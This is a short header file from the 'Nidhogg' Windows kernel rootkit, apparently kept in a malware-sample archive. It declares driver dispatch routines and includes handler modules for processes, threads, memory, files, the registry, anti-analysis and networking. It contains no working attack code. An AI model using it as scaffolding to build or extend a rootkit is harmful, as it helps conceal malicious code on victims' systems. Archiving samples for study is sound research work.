/*
  name      Nidhogg
  type      rootkit
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#pragma once
#include "pch.h"
#include "IoctlShared.h"
#include "MemoryHelper.h"
#include "MemoryAllocator.hpp"
#include "ProcessHandler.h"
#include "ThreadHandler.h"
#include "MemoryHandler.h"
#include "FileHandler.h"
#include "RegistryHandler.h"
#include "AntiAnalysisHandler.h"
#include "NetworkHandler.h"
#include "NofLoader.h"

DRIVER_DISPATCH NidhoggCreateClose;
DRIVER_DISPATCH NidhoggDeviceControl;
